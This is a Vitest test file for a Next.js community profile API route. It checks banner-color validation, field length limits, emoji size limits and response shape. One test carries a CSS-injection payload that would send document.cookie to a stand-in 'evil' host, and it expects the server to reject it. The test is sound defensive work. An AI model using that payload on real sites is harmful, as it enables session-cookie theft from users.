import { describe, it, expect, vi, beforeEach } from "vitest"
import { NextRequest } from "next/server"

const getProfile = vi.fn()
const updateProfile = vi.fn()
const getUser = vi.fn()
const updateUser = vi.fn()

vi.mock("@opennextjs/cloudflare", () => ({
  getCloudflareContext: vi.fn(() => ({ env: { DB: {} } })),
}))

vi.mock("@/lib/db", () => ({ getDb: vi.fn(() => ({})) }))

vi.mock("@alook/shared", async () => {
  const actual = await vi.importActual<typeof import("@alook/shared")>("@alook/shared")
  return {
    ...actual,
    queries: {
      communityUserProfile: {
        getProfile: (...a: unknown[]) => getProfile(...a),
        updateProfile: (...a: unknown[]) => updateProfile(...a),
      },
      user: {
        getUserSelf: (...a: unknown[]) => getUser(...a),
        updateUser: (...a: unknown[]) => updateUser(...a),
      },
    },
  }
})

vi.mock("@/lib/middleware/auth", () => ({
  withAuth: vi.fn((handler: any) => async (req: any, ctx?: any) => {
    const params = ctx?.params instanceof Promise ? await ctx.params : ctx?.params
    return handler(req, { env: {}, userId: "u1", email: "u@t.com", params })
  }),
}))

vi.mock("@/lib/middleware/helpers", async () => {
  const { NextResponse } = require("next/server")
  return {
    writeJSON: (data: unknown, status = 200) => NextResponse.json(data, { status }),
    writeError: (message: string, status: number) => NextResponse.json({ error: message }, { status }),
  }
})

const fanOutStatusUpdate = vi.fn()
vi.mock("@/lib/community/fanout", () => ({
  fanOutStatusUpdate: (...a: unknown[]) => fanOutStatusUpdate(...a),
}))

import { GET, PATCH } from "./route"

function patchReq(body: unknown) {
  return new NextRequest("http://localhost/api/community/users/me/profile", {
    method: "PATCH",
    body: JSON.stringify(body),
    headers: { "Content-Type": "application/json" },
  })
}

describe("GET /api/community/users/me/profile", () => {
  beforeEach(() => {
    vi.clearAllMocks()
    getUser.mockResolvedValue({ id: "u1", discriminator: "4242" })
  })

  it("returns defaults when no profile row exists", async () => {
    getProfile.mockResolvedValue(null)
    const res = await GET(new NextRequest("http://localhost/api/community/users/me/profile"), {} as never)
    expect(res.status).toBe(200)
    expect(await res.json()).toEqual({
      aboutMe: "",
      bannerColor: null,
      discriminator: "4242",
      statusEmoji: null,
      statusText: "",
    })
  })

  it("returns the stored profile fields when they exist", async () => {
    getProfile.mockResolvedValue({ aboutMe: "hi", bannerColor: "#aabbcc", statusEmoji: "🎧", statusText: "Vibing" })
    const res = await GET(new NextRequest("http://localhost/api/community/users/me/profile"), {} as never)
    expect(await res.json()).toEqual({
      aboutMe: "hi",
      bannerColor: "#aabbcc",
      discriminator: "4242",
      statusEmoji: "🎧",
      statusText: "Vibing",
    })
  })

  it("falls back to \"0000\" when the user row is missing", async () => {
    getProfile.mockResolvedValue(null)
    getUser.mockResolvedValue(null)
    const res = await GET(new NextRequest("http://localhost/api/community/users/me/profile"), {} as never)
    expect(await res.json()).toEqual({
      aboutMe: "",
      bannerColor: null,
      discriminator: "0000",
      statusEmoji: null,
      statusText: "",
    })
  })
})

describe("PATCH /api/community/users/me/profile", () => {
  beforeEach(() => {
    vi.clearAllMocks()
    updateUser.mockResolvedValue(undefined)
    fanOutStatusUpdate.mockResolvedValue(undefined)
    updateProfile.mockImplementation(async (_db, _u, data) => ({
      aboutMe: data.aboutMe ?? null,
      bannerColor: data.bannerColor ?? null,
      statusEmoji: data.statusEmoji ?? null,
      statusText: data.statusText ?? null,
    }))
  })

  it("accepts a valid hex bannerColor", async () => {
    const res = await PATCH(patchReq({ bannerColor: "#aabbcc" }), {} as never)
    expect(res.status).toBe(200)
    expect(updateProfile).toHaveBeenCalledWith({}, "u1", { bannerColor: "#aabbcc" })
  })

  it("accepts a 3-digit hex bannerColor", async () => {
    const res = await PATCH(patchReq({ bannerColor: "#abc" }), {} as never)
    expect(res.status).toBe(200)
  })

  it("accepts null to clear the bannerColor", async () => {
    const res = await PATCH(patchReq({ bannerColor: null }), {} as never)
    expect(res.status).toBe(200)
    expect(updateProfile).toHaveBeenCalledWith({}, "u1", { bannerColor: null })
  })

  it("rejects CSS-injection payloads in bannerColor (400)", async () => {
    // The exact attack: smuggle a CSS expression that would execute in
    // a `style` attribute if the value isn't validated server-side.
    const res = await PATCH(
      patchReq({ bannerColor: "red; background: url('https://evil/exfil?c=' + document.cookie)" }),
      {} as never,
    )
    expect(res.status).toBe(400)
    expect(updateProfile).not.toHaveBeenCalled()
  })

  it("rejects named CSS colors (not in hex allowlist)", async () => {
    const res = await PATCH(patchReq({ bannerColor: "red" }), {} as never)
    expect(res.status).toBe(400)
  })

  it("rejects bannerColor without a leading #", async () => {
    const res = await PATCH(patchReq({ bannerColor: "aabbcc" }), {} as never)
    expect(res.status).toBe(400)
  })

  it("400 when name exceeds MAX_PROFILE_NAME_LENGTH", async () => {
    const res = await PATCH(patchReq({ name: "x".repeat(101) }), {} as never)
    expect(res.status).toBe(400)
    expect(updateUser).not.toHaveBeenCalled()
  })

  it("400 when aboutMe exceeds MAX_PROFILE_ABOUT_LENGTH", async () => {
    const res = await PATCH(patchReq({ aboutMe: "x".repeat(1001) }), {} as never)
    expect(res.status).toBe(400)
    expect(updateProfile).not.toHaveBeenCalled()
  })

  it("400 when no fields are provided", async () => {
    const res = await PATCH(patchReq({}), {} as never)
    expect(res.status).toBe(400)
    expect(updateProfile).not.toHaveBeenCalled()
    expect(updateUser).not.toHaveBeenCalled()
  })

  it("rename path calls updateUser with { name } only and does not read the user", async () => {
    const res = await PATCH(patchReq({ name: "New" }), {} as never)
    expect(res.status).toBe(200)
    expect(updateUser).toHaveBeenCalledWith({}, "u1", { name: "New" })
    expect(getUser).not.toHaveBeenCalled()
  })

  it("returns shape consistent with GET (no userId leak)", async () => {
    updateProfile.mockResolvedValue({
      aboutMe: "hi",
      bannerColor: "#aabbcc",
      statusEmoji: null,
      statusText: null,
      userId: "u1",
    })
    const res = await PATCH(patchReq({ aboutMe: "hi" }), {} as never)
    const body = await res.json()
    expect(body).toEqual({ aboutMe: "hi", bannerColor: "#aabbcc", statusEmoji: null, statusText: "" })
    expect(body).not.toHaveProperty("userId")
  })

  it("accepts a status-only PATCH (no aboutMe/bannerColor/name) — not rejected by the early-exit guard", async () => {
    const res = await PATCH(patchReq({ statusEmoji: "🎧" }), {} as never)
    expect(res.status).toBe(200)
    expect(updateProfile).toHaveBeenCalledWith({}, "u1", { statusEmoji: "🎧" })
  })

  it("accepts clearing statusEmoji/statusText to null/\"\"", async () => {
    const res = await PATCH(patchReq({ statusEmoji: null, statusText: null }), {} as never)
    expect(res.status).toBe(200)
    expect(updateProfile).toHaveBeenCalledWith({}, "u1", { statusEmoji: null, statusText: null })
  })

  it("rejects statusEmoji over MAX_EMOJI_BYTES (multi-codepoint ZWJ emoji near the boundary)", async () => {
    // Family emoji (man, woman, girl, boy joined by ZWJ) — well over 32 UTF-8
    // bytes as a single "emoji", unlike a long run of ASCII characters.
    const familyEmoji = "👨\u200d👩\u200d👧\u200d👦".repeat(2)
    const res = await PATCH(patchReq({ statusEmoji: familyEmoji }), {} as never)
    expect(res.status).toBe(400)
    expect(updateProfile).not.toHaveBeenCalled()
  })

  it("rejects statusText over MAX_STATUS_TEXT_LENGTH", async () => {
    const res = await PATCH(patchReq({ statusText: "x".repeat(61) }), {} as never)
    expect(res.status).toBe(400)
    expect(updateProfile).not.toHaveBeenCalled()
  })

  it("does not call fanOutStatusUpdate when only aboutMe changes", async () => {
    const res = await PATCH(patchReq({ aboutMe: "hi" }), {} as never)
    expect(res.status).toBe(200)
    expect(fanOutStatusUpdate).not.toHaveBeenCalled()
  })

  it("calls fanOutStatusUpdate when statusEmoji/statusText change", async () => {
    const res = await PATCH(patchReq({ statusEmoji: "🎧", statusText: "Vibing" }), {} as never)
    expect(res.status).toBe(200)
    expect(fanOutStatusUpdate).toHaveBeenCalledWith("u1", "🎧", "Vibing")
  })
})
